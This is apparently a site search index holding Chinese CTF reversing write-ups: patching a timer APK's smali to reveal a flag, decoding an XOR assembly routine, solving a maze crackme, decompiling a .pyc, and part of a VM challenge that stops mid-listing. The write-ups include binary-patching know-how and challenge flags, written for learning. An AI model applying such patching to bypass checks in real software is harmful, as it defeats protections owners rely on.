Flag Is 那里的跳转）改为\nif-ltz v0, :cond_0\n\n\n将 k 值改为常量，即上文提到的 smali 文件中的\niget v3, v3 ....(省略);-\nk:I\n之后\n另起一行\n添加\nconst v3, 1616384\n\n\n重新打包，签名，安装，得到 flag 为 alictf{Y0vAr3TimerMa3te7} \n\n\n\n\n注意：\n\n\n\n\n\n\nandroid killer1.3版本中的apktools版本编译会发生错误，下载最新的apktool之后，在配置中添加并应用，成功\n\n\n\n\n\n\n手动运行apktools实现反编译，修改，打包，运行的过程\n\n\n\n\n\n\njava命令行使用\n，要注意test包名需要手动创建，运行指令为：\njava test.Main\n\n\n\n\n\n\nvs code下运行java单文件，需要在同级目录下创建\n.classpath\n文件\n\n\n\n\n\n\nxml\n   \n?xml version=\"1.0\" encoding=\"UTF-8\"?\n\n   \nclasspath\n\n       \nclasspathentry kind=\"src\" path=\"src\"/\n\n       \nclasspathentry kind=\"con\" path=\"org.eclipse.jdt.launching.JRE_CONTAINER/org.eclipse.jdt.internal.debug.ui.launcher.StandardVMType/JavaSE-1.8/\"/\n\n       \nclasspathentry kind=\"con\" path=\"org.eclipse.buildship.core.gradleclasspathcontainer\"/\n\n       \nclasspathentry kind=\"output\" path=\"bin\"/\n\n   \n/classpath", 
            "title": "[bugku.com] ali"
        }, 
        {
            "location": "/wargame/reversing/[bugku.com]_ali/#timerctf", 
            "text": "", 
            "title": "Timer(阿里CTF)"
        }, 
        {
            "location": "/wargame/reversing/[bugku.com]_ali/#0x1", 
            "text": "flag格式 flag{}", 
            "title": "0x1 题目"
        }, 
        {
            "location": "/wargame/reversing/[bugku.com]_ali/#0x2", 
            "text": "参考链接：https://blog.csdn.net/xiangshangbashaonian/article/details/80301054", 
            "title": "0x2 解题步骤"
        }, 
        {
            "location": "/wargame/reversing/[bugku.com]_ali/#0x1-jeb", 
            "text": "apk安装之后出现一个读秒的，20万秒，大于3600，所以大于一个小时，所以太慢了，不等了。    jeb反编译，MainActivity代码   package net.bluelotus.tomorrow.easyandroid;\n\nimport android.os.Bundle;\nimport android.os.Handler;\nimport android.support.v7.app.AppCompatActivity;\nimport android.view.Menu;\nimport android.view.MenuItem;\nimport android.view.View;\n\npublic class MainActivity extends AppCompatActivity {\n    int beg;\n    int k;\n    int now;\n    long t;\n\n    static {\n        System.loadLibrary( lhm );\n    }\n\n    public MainActivity() {\n        super();\n        this.beg = (((int)(System.currentTimeMillis() / 1000))) + 200000;\n        this.k = 0;\n        this.t = 0;\n    }\n\n    public static boolean is2(int n) {\n        boolean v1 = true;\n        if(n   3) {\n            if(n % 2 != 0   n % 3 != 0) {\n                int v0 = 5;\n                while(true) {\n                    if(v0 * v0  = n) {\n                        if(n % v0 != 0   n % (v0 + 2) != 0) {\n                            v0 += 6;\n                            continue;\n                        }\n\n                        return false;\n                    }\n                    else {\n                        return v1;\n                    }\n                }\n\n                return false;\n            }\n\n            v1 = false;\n        }\n        else if(n  = 1) {\n            v1 = false;\n        }\n\n        return v1;\n    }\n\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        this.setContentView(2130968600);\n        View v2 = this.findViewById(2131492944);\n        View v3 = this.findViewById(2131492945);\n        Handler v0 = new Handler();\n        v0.postDelayed(new Runnable() {\n            public void run() {\n                MainActivity.this.t = System.currentTimeMillis();\n                MainActivity.this.now = ((int)(MainActivity.this.t / 1000));\n                MainActivity.this.t = 1500 - MainActivity.this.t % 1000;\n                this.val$tv2.setText( AliCTF );\n                if(MainActivity.this.beg - MainActivity.this.now  = 0) {\n                    this.val$tv1.setText( The flag is: );\n                    this.val$tv2.setText( alictf{  + MainActivity.this.stringFromJNI2(MainActivity.this\n                            .k) +  } );\n                }\n\n                if(MainActivity.is2(MainActivity.this.beg - MainActivity.this.now)) {\n                    MainActivity.this.k += 100;\n                }\n                else {\n                    --MainActivity.this.k;\n                }\n\n                this.val$tv1.setText( Time Remaining(s):  + (MainActivity.this.beg - MainActivity.this\n                        .now));\n                this.val$handler.postDelayed(((Runnable)this), MainActivity.this.t);\n            }\n        }, 0);\n    }\n\n    public boolean onCreateOptionsMenu(Menu menu) {\n        this.getMenuInflater().inflate(2131558400, menu);\n        return 1;\n    }\n\n    public boolean onOptionsItemSelected(MenuItem item) {\n        boolean v1 = item.getItemId() == 2131492959 ? true : super.onOptionsItemSelected(item);\n        return v1;\n    }\n\n    public native String stringFromJNI2(int arg1) {\n    }\n}   关键点   java\n  if(MainActivity.this.beg - MainActivity.this.now  = 0) {\n                      this.val$tv1.setText(\"The flag is:\");\n                      this.val$tv2.setText(\"alictf{\" + MainActivity.this.stringFromJNI2(MainActivity.this\n                              .k) + \"}\");\n                  }   找到 beg 和 now 的点：    ```java\n  public MainActivity() {\n          super();\n          this.beg = (((int)(System.currentTimeMillis() / 1000))) + 200000;//打开activity时候的时间（除以1000，所以是秒为单位）再加上200000，即200000+当前时间对应的秒\n          this.k = 0;\n          this.t = 0;\n      }  ```  以及 MainActivity.this.now = ((int)(MainActivity.this.t / 1000)); 即判断的时候的秒  那么 beg - now 就是 200000 + 开始的时间 - 判断的时间，也就是 200000 - 已经过去的时间，所以就是如果过去了 200000 秒，就可以出现 flag 了。  呈现 flag 是通过 native 层的 this.val$tv2.setText(\"alictf{\" + MainActivity.this.stringFromJNI2(MainActivity.this .k) + \"}\"); 也就是 stringFromJNI2 来呈现的，我们不必逆向 so，这个参数是一个 k，如果真的去等 200000 秒（虽然不可能），那么这里的 k 应该是多少呢？    跟 k 相关的两个关键点如下：    ```java\n  public static boolean is2(int n) {\n          boolean v1 = true;\n          if(n   3) {\n              if(n % 2 != 0   n % 3 != 0) {\n                  int v0 = 5;\n                  while(true) {\n                      if(v0 * v0  = n) {\n                          if(n % v0 != 0   n % (v0 + 2) != 0) {\n                              v0 += 6;\n                              continue;\n                          }                        return false;\n                  }\n                  else {\n                      return v1;\n                  }\n              }\n\n              return false;\n          }\n\n          v1 = false;\n      }\n      else if(n  = 1) {\n          v1 = false;\n      }\n\n      return v1;\n  }  if(MainActivity.is2(MainActivity.this.beg - MainActivity.this.now)) {\n                      MainActivity.this.k += 100;\n                  }\n                  else {\n                      --MainActivity.this.k;\n                  }  ```   总结思路：通过 beg - now 代入 is2 函数对 k 进行操作，200000，需要一秒一秒的操作，而我们，直接通过写代码模拟出 200000 的结果，找到 k，然后改动 k 值，直接调用，就可以得到 flag 了。", 
            "title": "0x1 jeb分析文件"
        }, 
        {
            "location": "/wargame/reversing/[bugku.com]_ali/#0x2-k", 
            "text": "is2 是用 java 写的，懒得看逻辑，直接复制到 java 里边：   package test;\n\npublic class Main {\n\n    public static boolean is2(int n) {\n        boolean v1 = true;\n        if(n   3) {\n            if(n % 2 != 0   n % 3 != 0) {\n                int v0 = 5;\n                while(true) {\n                    if(v0 * v0  = n) {\n                        if(n % v0 != 0   n % (v0 + 2) != 0) {\n                            v0 += 6;\n                            continue;\n                        }\n\n                        return false;\n                    }\n                    else {\n                        return v1;\n                    }\n                }\n            }\n\n            v1 = false;\n        }\n        else if(n  = 1) {\n            v1 = false;\n        }\n\n        return v1;\n    }\n\n    public static void main(String args[]) {\n        int time = 200000;\n        int k = 0;\n        while (time   0) {\n            if (is2(time)) {\n                k += 100;\n            }\n            else {\n                k--;\n            }\n            time--;\n        }\n        System.out.println(k);\n    }\n\n}  输出：运行得到 k 值:1616384", 
            "title": "0x2 计算k值"
        }, 
        {
            "location": "/wargame/reversing/[bugku.com]_ali/#0x3-apk", 
            "text": "将输出 flag 的条件反过来，即 MainActivity$1.smali 中的 if-gtz v0, :cond_0 这句话（后面是输出 The Flag Is 那里的跳转）改为 if-ltz v0, :cond_0  将 k 值改为常量，即上文提到的 smali 文件中的 iget v3, v3 ....(省略);- k:I 之后 另起一行 添加 const v3, 1616384  重新打包，签名，安装，得到 flag 为 alictf{Y0vAr3TimerMa3te7}    注意：    android killer1.3版本中的apktools版本编译会发生错误，下载最新的apktool之后，在配置中添加并应用，成功    手动运行apktools实现反编译，修改，打包，运行的过程    java命令行使用 ，要注意test包名需要手动创建，运行指令为： java test.Main    vs code下运行java单文件，需要在同级目录下创建 .classpath 文件    xml\n    ?xml version=\"1.0\" encoding=\"UTF-8\"? \n    classpath \n        classpathentry kind=\"src\" path=\"src\"/ \n        classpathentry kind=\"con\" path=\"org.eclipse.jdt.launching.JRE_CONTAINER/org.eclipse.jdt.internal.debug.ui.launcher.StandardVMType/JavaSE-1.8/\"/ \n        classpathentry kind=\"con\" path=\"org.eclipse.buildship.core.gradleclasspathcontainer\"/ \n        classpathentry kind=\"output\" path=\"bin\"/ \n    /classpath", 
            "title": "0x3 修改并打包运行原apk"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_ReadAsm2/", 
            "text": "ReadAsm2\n\n\n0x1 题目\n\n\n\n\n读汇编是逆向基本功。\n\n\n给出的文件是func函数的汇编\nmain函数如下\n输出的结果即为flag，格式为\nflag{**********}\n，请连flag{}一起提交\n\n\n编译环境为linux gcc x86-64\n调用约定为System V AMD64 ABI\n\n请不要利用汇编器，IDA等工具。。这里考的就是读汇编与推算汇编结果的能力\n\n\n\n\nint main(int argc, char const *argv[])\n{\n  char input[] = {0x0,  0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,\n                  0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,\n                  0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c};\n  func(input, 28);\n  printf(\n%s\\n\n,input+1);\n  return 0;\n}\n\n\n\n\n\n\n参考资料: \nhttps://github.com/veficos/reverse-engineering-for-beginners\n \n\n\n《汇编语言》王爽 \n\n\n《C 反汇编与逆向分析技术揭秘》 \n\n\n\n\n0x2 解题步骤\n\n\n0x1 阅读.2asm\n\n\n\n\n参考：https://blog.csdn.net/github_35681219/article/details/52973809\n\n\n\n\n00000000004004e6 \nfunc\n:\n  4004e6: 55                    push   rbp\n  4004e7: 48 89 e5              mov    rbp,rsp\n  4004ea: 48 89 7d e8           mov    QWORD PTR [rbp-0x18],rdi     ;0x18=rdi(input)\n  4004ee: 89 75 e4              mov    DWORD PTR [rbp-0x1c],esi     ;0x1c=esi(28)\n  4004f1: c7 45 fc 01 00 00 00  mov    DWORD PTR [rbp-0x4],0x1      ;0x4(count)=1\n  4004f8: eb 28                 jmp    400522 \nfunc+0x3c\n\n  4004fa: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]      \n  4004fd: 48 63 d0              movsxd rdx,eax\n  400500: 48 8b 45 e8           mov    rax,QWORD PTR [rbp-0x18]     ;rax=input[0]   \n  400504: 48 01 d0              add    rax,rdx                      ;rax = input [count]\n  400507: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]\n  40050a: 48 63 ca              movsxd rcx,edx\n  40050d: 48 8b 55 e8           mov    rdx,QWORD PTR [rbp-0x18]\n  400511: 48 01 ca              add    rdx,rcx                      ;rdx = input[count]\n  400514: 0f b6 0a              movzx  ecx,BYTE PTR [rdx]           \n  400517: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]\n  40051a: 31 ca                 xor    edx,ecx                      ;int(byte(count))^int(byte(input +                                                                     count)) \n  40051c: 88 10                 mov    BYTE PTR [rax],dl            ;byte(input + count) =                                                                  byte(int(byte(count))^int(byte(input + count)))\n                                                            ;更好的形式：input[count]^=count\n  40051e: 83 45 fc 01           add    DWORD PTR [rbp-0x4],0x1      ;count++\n  400522: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]      \n  400525: 3b 45 e4              cmp    eax,DWORD PTR [rbp-0x1c]     ;if count\n=int(28)\n  400528: 7e d0                 jle    4004fa \nfunc+0x14\n\n  40052a: 90                    nop\n  40052b: 5d                    pop    rbp\n  40052c: c3                    ret\n\n\n\n\n0x2 写出pyton代码\n\n\ninput=[0x0,0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62,0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66,0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76,0x6b, 0x70, 0x79, 0x66 ,0x1c]\ncount = 28\n\nres=''\n# print input[28]\nfor i in xrange(count):\n\n    # print input[i+1]\n    # print chr(input[i+1])\n    tmp = chr(input[i+1]^(i+1))\n    print tmp\n    res+=tmp\n    # print res\nprint res\n\n\n\n\n跑出答案：flag{read_asm_is_the_basic}\n\n\n需要注意的：input开始运算的位置为1", 
            "title": "[ctf.nuptzj.cn] ReadAsm2"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_ReadAsm2/#readasm2", 
            "text": "", 
            "title": "ReadAsm2"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_ReadAsm2/#0x1", 
            "text": "读汇编是逆向基本功。  给出的文件是func函数的汇编\nmain函数如下\n输出的结果即为flag，格式为 flag{**********} ，请连flag{}一起提交  编译环境为linux gcc x86-64\n调用约定为System V AMD64 ABI 请不要利用汇编器，IDA等工具。。这里考的就是读汇编与推算汇编结果的能力   int main(int argc, char const *argv[])\n{\n  char input[] = {0x0,  0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,\n                  0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,\n                  0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c};\n  func(input, 28);\n  printf( %s\\n ,input+1);\n  return 0;\n}   参考资料:  https://github.com/veficos/reverse-engineering-for-beginners    《汇编语言》王爽   《C 反汇编与逆向分析技术揭秘》", 
            "title": "0x1 题目"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_ReadAsm2/#0x2", 
            "text": "", 
            "title": "0x2 解题步骤"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_ReadAsm2/#0x1-2asm", 
            "text": "参考：https://blog.csdn.net/github_35681219/article/details/52973809   00000000004004e6  func :\n  4004e6: 55                    push   rbp\n  4004e7: 48 89 e5              mov    rbp,rsp\n  4004ea: 48 89 7d e8           mov    QWORD PTR [rbp-0x18],rdi     ;0x18=rdi(input)\n  4004ee: 89 75 e4              mov    DWORD PTR [rbp-0x1c],esi     ;0x1c=esi(28)\n  4004f1: c7 45 fc 01 00 00 00  mov    DWORD PTR [rbp-0x4],0x1      ;0x4(count)=1\n  4004f8: eb 28                 jmp    400522  func+0x3c \n  4004fa: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]      \n  4004fd: 48 63 d0              movsxd rdx,eax\n  400500: 48 8b 45 e8           mov    rax,QWORD PTR [rbp-0x18]     ;rax=input[0]   \n  400504: 48 01 d0              add    rax,rdx                      ;rax = input [count]\n  400507: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]\n  40050a: 48 63 ca              movsxd rcx,edx\n  40050d: 48 8b 55 e8           mov    rdx,QWORD PTR [rbp-0x18]\n  400511: 48 01 ca              add    rdx,rcx                      ;rdx = input[count]\n  400514: 0f b6 0a              movzx  ecx,BYTE PTR [rdx]           \n  400517: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]\n  40051a: 31 ca                 xor    edx,ecx                      ;int(byte(count))^int(byte(input +                                                                     count)) \n  40051c: 88 10                 mov    BYTE PTR [rax],dl            ;byte(input + count) =                                                                  byte(int(byte(count))^int(byte(input + count)))\n                                                            ;更好的形式：input[count]^=count\n  40051e: 83 45 fc 01           add    DWORD PTR [rbp-0x4],0x1      ;count++\n  400522: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]      \n  400525: 3b 45 e4              cmp    eax,DWORD PTR [rbp-0x1c]     ;if count =int(28)\n  400528: 7e d0                 jle    4004fa  func+0x14 \n  40052a: 90                    nop\n  40052b: 5d                    pop    rbp\n  40052c: c3                    ret", 
            "title": "0x1 阅读.2asm"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_ReadAsm2/#0x2-pyton", 
            "text": "input=[0x0,0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62,0x69, 0x6d, 0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66,0x63, 0x4e, 0x66, 0x7b, 0x71, 0x4a, 0x74, 0x76,0x6b, 0x70, 0x79, 0x66 ,0x1c]\ncount = 28\n\nres=''\n# print input[28]\nfor i in xrange(count):\n\n    # print input[i+1]\n    # print chr(input[i+1])\n    tmp = chr(input[i+1]^(i+1))\n    print tmp\n    res+=tmp\n    # print res\nprint res  跑出答案：flag{read_asm_is_the_basic}  需要注意的：input开始运算的位置为1", 
            "title": "0x2 写出pyton代码"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_maze/", 
            "text": "maze\n\n\n0x1 题目\n\n\n\n\nmaze 迷宫\n\n\n格式：\nnctf{********}\n\n\n\n\n0x2 解题步骤\n\n\n0x1 ida分析文件\n\n\nELF64位程序，使用ida64打开\n\n\n看到关键的判断代码\n\n\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  signed __int64 position; // rbx@4\n  signed int input_position; // eax@5\n  bool v5; // bp@5\n  bool v6; // al@8\n  const char *outup_string; // rdi@19\n  __int64 row; // [sp+0h] [bp-28h]@1\n\n  row = 0LL;\n  puts(\nInput flag:\n);\n  scanf(\n%s\n, \ninput, 0LL);\n  if ( strlen(\ninput) != 24 || strncmp(\ninput, \nnctf{\n, 5uLL) || *(\nbyte_6010BF + 24) != 125 )\n  {\nLABEL_22:\n    puts(\nWrong flag!\n);\n    exit(-1);\n  }\n  position = 5LL;\n  if ( strlen(\ninput) - 1 \n 5 )\n  {\n    while ( 1 )\n    {\n      input_position = *(\ninput + position);\n      v5 = 0;\n      if ( input_position \n 78 )\n      {\n        input_position = (unsigned __int8)input_position;\n        if ( (unsigned __int8)input_position == 'O' )\n        {\n          v6 = go_left((_DWORD *)\nrow + 1);\n          goto LABEL_14;\n        }\n        if ( input_position == 'o' )\n        {\n          v6 = go_right((int *)\nrow + 1);\n          goto LABEL_14;\n        }\n      }\n      else\n      {\n        input_position = (unsigned __int8)input_position;\n        if ( (unsigned __int8)input_position == '.' )\n        {\n          v6 = go_up(\nrow);\n          goto LABEL_14;\n        }\n        if ( input_position == '0' )\n        {\n          v6 = go_down((int *)\nrow);\nLABEL_14:\n          v5 = v6;\n          goto LABEL_15;\n        }\n      }\nLABEL_15:\n      if ( !(unsigned __int8)is_space_sharp((__int64)maze_string, SHIDWORD(row), row) )\n        goto LABEL_22;\n      if ( ++position \n= strlen(\ninput) - 1 )\n      {\n        if ( v5 )\n          break;\nlabel_wrong:\n        outup_string = \nWrong flag!\n;\n        goto LABEL_21;\n      }\n    }\n  }\n  if ( *(\nmaze_string[8 * (signed int)row] + SHIDWORD(row)) != '#' )\n    goto label_wrong;\n  outup_string = \nCongratulations!\n;\nLABEL_21:\n  puts(outup_string);\n  return 0LL;\n}\n\n\n\n\n\n\n其中许多关键变量，我进行了重新命名，使程序的可读性更好\n\n\n参考链接：https://blog.csdn.net/whklhhhh/article/details/74852452（其中有更详细的解释）\n\n\n参考链接2：http://n3k0sec.top/2017/12/11/%E5%8D%97%E9%82%AEReverse/#maze（这里有pythonida的脚本）\n\n\n\n\n0x2 pythonida中打印迷宫\n\n\nfor i in range(8):\n    for j in range(8):\n        print chr(Byte(0x601060+j+i*8)),\n    print\n\n\n\n\n输出：\n\n\n    * * * * * *\n*       *     *\n* * *   *   * *\n* *     *   * *\n*     * #     *\n* *   * * *   *\n* *           *\n* * * * * * * *\n\n\n\n\n\n0x3 走迷宫\n\n\n!r******\n*drr*!!*\n***d*!**\n**ld*!**\n*!d*llu*\n**d***u*\n**drrrr*\n********\n\n\n\n\nr:right l:left d:down u:up\n\n\n\n\n\n\n得到字符串：rdrrddldddrrrruull\n\n\n\n\n\n\n使用题目要求的字符替换，规则如下：\n\n\n\n\n\n\nr o \n  l O\n  u .\n  d 0\n\n\n\n\n得到flag： \nnctf{o0oo00O000oooo..OO}\n\n\n\n\n提交flag，提示错误，在本地运行，也发现错误，具体原因待查\n\n\n从\n博文\n中找到了flag：\nnctf{o0oo00O000oooo..OO}\n，提交居然成功了，对比一下，发现和之前做出来的一样，难道是复制粘贴的问题？还是平台的故障？\n\n\n不过在本地运行程序，给出的答案依然是错的，以后可以试试动态调试，看看哪里有问题", 
            "title": "[ctf.nuptzj.cn] maze"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_maze/#maze", 
            "text": "", 
            "title": "maze"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_maze/#0x1", 
            "text": "maze 迷宫  格式： nctf{********}", 
            "title": "0x1 题目"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_maze/#0x2", 
            "text": "", 
            "title": "0x2 解题步骤"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_maze/#0x1-ida", 
            "text": "ELF64位程序，使用ida64打开  看到关键的判断代码  __int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  signed __int64 position; // rbx@4\n  signed int input_position; // eax@5\n  bool v5; // bp@5\n  bool v6; // al@8\n  const char *outup_string; // rdi@19\n  __int64 row; // [sp+0h] [bp-28h]@1\n\n  row = 0LL;\n  puts( Input flag: );\n  scanf( %s ,  input, 0LL);\n  if ( strlen( input) != 24 || strncmp( input,  nctf{ , 5uLL) || *( byte_6010BF + 24) != 125 )\n  {\nLABEL_22:\n    puts( Wrong flag! );\n    exit(-1);\n  }\n  position = 5LL;\n  if ( strlen( input) - 1   5 )\n  {\n    while ( 1 )\n    {\n      input_position = *( input + position);\n      v5 = 0;\n      if ( input_position   78 )\n      {\n        input_position = (unsigned __int8)input_position;\n        if ( (unsigned __int8)input_position == 'O' )\n        {\n          v6 = go_left((_DWORD *) row + 1);\n          goto LABEL_14;\n        }\n        if ( input_position == 'o' )\n        {\n          v6 = go_right((int *) row + 1);\n          goto LABEL_14;\n        }\n      }\n      else\n      {\n        input_position = (unsigned __int8)input_position;\n        if ( (unsigned __int8)input_position == '.' )\n        {\n          v6 = go_up( row);\n          goto LABEL_14;\n        }\n        if ( input_position == '0' )\n        {\n          v6 = go_down((int *) row);\nLABEL_14:\n          v5 = v6;\n          goto LABEL_15;\n        }\n      }\nLABEL_15:\n      if ( !(unsigned __int8)is_space_sharp((__int64)maze_string, SHIDWORD(row), row) )\n        goto LABEL_22;\n      if ( ++position  = strlen( input) - 1 )\n      {\n        if ( v5 )\n          break;\nlabel_wrong:\n        outup_string =  Wrong flag! ;\n        goto LABEL_21;\n      }\n    }\n  }\n  if ( *( maze_string[8 * (signed int)row] + SHIDWORD(row)) != '#' )\n    goto label_wrong;\n  outup_string =  Congratulations! ;\nLABEL_21:\n  puts(outup_string);\n  return 0LL;\n}   其中许多关键变量，我进行了重新命名，使程序的可读性更好  参考链接：https://blog.csdn.net/whklhhhh/article/details/74852452（其中有更详细的解释）  参考链接2：http://n3k0sec.top/2017/12/11/%E5%8D%97%E9%82%AEReverse/#maze（这里有pythonida的脚本）", 
            "title": "0x1 ida分析文件"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_maze/#0x2-pythonida", 
            "text": "for i in range(8):\n    for j in range(8):\n        print chr(Byte(0x601060+j+i*8)),\n    print  输出：      * * * * * *\n*       *     *\n* * *   *   * *\n* *     *   * *\n*     * #     *\n* *   * * *   *\n* *           *\n* * * * * * * *", 
            "title": "0x2 pythonida中打印迷宫"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_maze/#0x3", 
            "text": "!r******\n*drr*!!*\n***d*!**\n**ld*!**\n*!d*llu*\n**d***u*\n**drrrr*\n********  r:right l:left d:down u:up    得到字符串：rdrrddldddrrrruull    使用题目要求的字符替换，规则如下：    r o \n  l O\n  u .\n  d 0   得到flag：  nctf{o0oo00O000oooo..OO}   提交flag，提示错误，在本地运行，也发现错误，具体原因待查  从 博文 中找到了flag： nctf{o0oo00O000oooo..OO} ，提交居然成功了，对比一下，发现和之前做出来的一样，难道是复制粘贴的问题？还是平台的故障？  不过在本地运行程序，给出的答案依然是错的，以后可以试试动态调试，看看哪里有问题", 
            "title": "0x3 走迷宫"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_py/", 
            "text": "py交易\n\n\n0x1 题目\n\n\n\n\nPython 2.7 \n\n\npy.pyc\n\n\n\n\n0x2 解题步骤\n\n\n0x1 反编译py.pyc\n\n\nuncompyle6 Py.pyc \n py.py\n\n\n\n\n得到py.py文件：\n\n\n# uncompyle6 version 3.2.3\n# Python bytecode 2.7 (62211)\n# Decompiled from: Python 2.7.8 (default, Jun 30 2014, 16:03:49) [MSC v.1500 32 bit (Intel)]\n# Embedded file name: 1.py\n# Compiled at: 2017-06-03 10:20:43\nimport base64\n\ndef encode(message):\n    s = ''\n    for i in message:\n        x = ord(i) ^ 32\n        x = x + 16\n        s += chr(x)\n\n    return base64.b64encode(s)\n\n\ncorrect = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'\nflag = ''\nprint 'Input flag:'\nflag = raw_input()\nif encode(flag) == correct:\n    print 'correct'\nelse:\n    print 'wrong'\n# okay decompiling Py.pyc\n\n\n\n\n0x2 编写逆算法\n\n\ndef decode(message):\n    message = base64.b64decode(message)\n    print \nmessage:\n + message\n    s = ''\n    for i in message:\n        tmp = ord(i)\n        print \ntmp:\n,\n        tmp = tmp -16\n        print tmp\n        s += chr(tmp^32)\n    return s\n\n\nprint decode(correct)\n\n\n\n\n\n得到flag： \nnctf{d3c0mpil1n9_PyC}", 
            "title": "[ctf.nuptzj.cn] py"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_py/#py", 
            "text": "", 
            "title": "py交易"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_py/#0x1", 
            "text": "Python 2.7   py.pyc", 
            "title": "0x1 题目"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_py/#0x2", 
            "text": "", 
            "title": "0x2 解题步骤"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_py/#0x1-pypyc", 
            "text": "uncompyle6 Py.pyc   py.py  得到py.py文件：  # uncompyle6 version 3.2.3\n# Python bytecode 2.7 (62211)\n# Decompiled from: Python 2.7.8 (default, Jun 30 2014, 16:03:49) [MSC v.1500 32 bit (Intel)]\n# Embedded file name: 1.py\n# Compiled at: 2017-06-03 10:20:43\nimport base64\n\ndef encode(message):\n    s = ''\n    for i in message:\n        x = ord(i) ^ 32\n        x = x + 16\n        s += chr(x)\n\n    return base64.b64encode(s)\n\n\ncorrect = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'\nflag = ''\nprint 'Input flag:'\nflag = raw_input()\nif encode(flag) == correct:\n    print 'correct'\nelse:\n    print 'wrong'\n# okay decompiling Py.pyc", 
            "title": "0x1 反编译py.pyc"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_py/#0x2_1", 
            "text": "def decode(message):\n    message = base64.b64decode(message)\n    print  message:  + message\n    s = ''\n    for i in message:\n        tmp = ord(i)\n        print  tmp: ,\n        tmp = tmp -16\n        print tmp\n        s += chr(tmp^32)\n    return s\n\n\nprint decode(correct)  得到flag：  nctf{d3c0mpil1n9_PyC}", 
            "title": "0x2 编写逆算法"
        }, 
        {
            "location": "/wargame/reversing/[ctf.nuptzj.cn]_wxyvm/", 
            "text": "WxyVM\n\n\n0x1 题目\n\n\n\n\nWxy大神的VM\n\n\n格式：\nnctf{********}\n\n\n\n\n0x2 解题步骤\n\n\n0x1 ida分析文件\n\n\nELF64位程序，使用ida64打开\n\n\n看到关键的判断代码\n\n\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  char v4; // [sp+Bh] [bp-5h]@1\n  signed int i; // [sp+Ch] [bp-4h]@3\n\n  puts(\n[WxyVM 0.0.1]\n);\n  puts(\ninput your flag:\n);\n  scanf(\n%s\n, \nbyte_604B80);\n  v4 = 1;\n  sub_4005B6();\n  if ( strlen(\nbyte_604B80) != 24 )\n    v4 = 0;\n  for ( i = 0; i \n= 23; ++i )\n  {\n    if ( *(\nbyte_604B80 + i) != unk_601060[i] )\n      v4 = 0;\n  }\n  if ( v4 )\n    puts(\ncorrect\n);\n  else\n    puts(\nwrong\n);\n  return 0LL;\n}\n\n\n\n\n关键是与unk_601060的比较，byte_604B80为输入值，sub_4005B6()应该对输入值进行了处理：\n\n\nsub_4005B6():\n\n\n__int64 sub_4005B6()\n{\n  unsigned int v0; // ST04_4@3\n  __int64 result; // rax@3\n  signed int i; // [sp+0h] [bp-10h]@1\n  char v3; // [sp+8h] [bp-8h]@3\n\n  for ( i = 0; i \n= 14999; i += 3 )\n  {\n    v0 = byte_6010C0[(signed __int64)i];\n    v3 = byte_6010C0[(signed __int64)(i + 2)];\n    result = v0;\n    switch ( v0 )\n    {\n      case 1u:\n        result = byte_6010C0[(signed __int64)(i + 1)];\n        *(\nbyte_604B80 + result) += v3;\n        break;\n      case 2u:\n        result = byte_6010C0[(signed __int64)(i + 1)];\n        *(\nbyte_604B80 + result) -= v3;\n        break;\n      case 3u:\n        result = byte_6010C0[(signed __int64)(i + 1)];\n        *(\nbyte_604B80 + result) ^= v3;\n        break;\n      case 4u:\n        result = byte_6010C0[(signed __int64)(i + 1)];\n        *(\nbyte_604B80 + result) *= v3;\n        break;\n      case 5u:\n        result = byte_6010C0[(signed __int64)(i + 1)];\n        *(\nbyte_604B80 + result) ^= *(\nbyte_604B80 + byte_6010C0[(signed __int64)(i + 2)]);\n        break;\n      default:\n        